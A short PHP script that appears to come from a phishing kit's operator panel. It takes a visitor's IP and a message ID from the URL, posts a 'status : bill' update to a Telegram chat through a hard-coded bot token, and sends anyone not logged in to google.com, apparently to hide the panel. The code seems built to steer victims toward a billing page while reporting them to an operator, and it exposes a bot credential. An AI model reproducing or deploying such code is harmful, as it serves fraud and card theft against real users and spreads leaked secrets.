<?php
session_start();
if(isset($_SESSION["username"])) {

if(isset($_GET['messageId'])){
  $botToken = "6887294087:AAEC802yB2ffTk_d0HaC43X6tv3VTnaHTOs";
  $chatID = "1064643518";
	$messageId=$_GET['messageId'];
	$ipzebi=$_GET['ipzebi'];
	$message ="IP: $ipzebi , status : bill";



// Initialize cURL session
$ch = curl_init();

// Set cURL options
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot".$botToken."/editMessageText");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'chat_id' => $chatID,
    'message_id' => $messageId,
    'text' => $message
]));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute cURL request
$response = curl_exec($ch);

// Close cURL session
curl_close($ch);

// Optionally, you can decode and use the response
$responseData = json_decode($response, true);

}
header('Location: login.php');

}else {
HEADER("Location: https://google.com");

}

?>